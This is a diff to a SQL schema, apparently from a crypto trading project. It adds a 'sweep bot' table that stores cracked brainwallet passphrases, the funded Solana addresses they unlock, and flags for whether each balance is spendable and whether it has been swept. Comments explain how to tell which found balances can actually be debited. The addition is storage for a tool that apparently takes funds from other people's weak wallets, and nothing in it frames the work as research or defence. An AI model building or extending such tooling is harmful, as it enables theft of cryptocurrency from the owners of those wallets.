@@ -708,3 +708,22 @@ CREATE TABLE IF NOT EXISTS desk_fill_costs (
   haircut_total_usd REAL NOT NULL
 );
 CREATE INDEX IF NOT EXISTS idx_desk_fill_costs_pos ON desk_fill_costs(position_id, ts);
+
+-- ───────────────────────────────────────────────────────────── sweep bot ─────
+-- Brainwallet discovery: a passphrase whose sha256 seed derives to a Solana
+-- address that holds SOL. `spendable` is NOT "lamports > 0" — lamports live in
+-- any account, and only the System Program lets a keypair debit its own. A row
+-- with spendable=0 is an address that looks funded and is somebody's rent.
+CREATE TABLE IF NOT EXISTS sweep_hits (
+  id         TEXT PRIMARY KEY,
+  ts         INTEGER NOT NULL,
+  address    TEXT NOT NULL,
+  passphrase TEXT NOT NULL,
+  lamports   INTEGER NOT NULL,
+  owner      TEXT NOT NULL,
+  space      INTEGER NOT NULL,
+  spendable  INTEGER NOT NULL DEFAULT 0,
+  swept      INTEGER NOT NULL DEFAULT 0
+);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_sweep_hits_addr ON sweep_hits(address);
+CREATE INDEX IF NOT EXISTS idx_sweep_hits_spendable ON sweep_hits(spendable, swept);
